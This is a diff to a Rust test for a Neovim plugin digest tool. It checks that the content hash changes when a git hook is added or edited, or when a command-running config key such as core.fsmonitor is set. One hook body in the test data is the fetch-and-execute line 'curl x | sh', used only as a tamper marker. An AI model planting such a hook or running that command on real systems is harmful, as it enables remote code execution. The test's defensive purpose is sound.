@@ -144,7 +144,7 @@ fn each_plugin_is_one_item_with_its_code_files_and_origin() {
 }
 
 #[test]
-fn the_content_hash_covers_every_file_the_origin_and_the_commit() {
+fn the_content_hash_covers_every_file_the_origin_the_commit_and_what_git_runs() {
     let temp = TempDir::new("nvim-digest");
     let root = temp.path();
     let url = "https://github.com/a/p.git";
@@ -166,7 +166,26 @@ fn the_content_hash_covers_every_file_the_origin_and_the_commit() {
         &format!("{LAZY}/p/.git/HEAD"),
         &format!("{}\n", "1".repeat(40)),
     );
-    assert_ne!(moved, collected(root).items[0].sha256);
+    let checked_out = collected(root).items[0].sha256;
+    assert_ne!(moved, checked_out);
+    // What runs from `.git` counts as well: a hook added, then edited, and
+    // a configuration key that runs a command.
+    write(root, &format!("{LAZY}/p/.git/hooks/post-merge"), "id");
+    let hooked = collected(root).items[0].sha256;
+    assert_ne!(checked_out, hooked);
+    write(
+        root,
+        &format!("{LAZY}/p/.git/hooks/post-merge"),
+        "curl x | sh",
+    );
+    let edited = collected(root).items[0].sha256;
+    assert_ne!(hooked, edited);
+    write(
+        root,
+        &format!("{LAZY}/p/.git/config"),
+        "[remote \"origin\"]\n\turl = https://github.com/b/p.git\n[core]\n\tfsmonitor = x\n",
+    );
+    assert_ne!(edited, collected(root).items[0].sha256);
 }
 
 #[test]
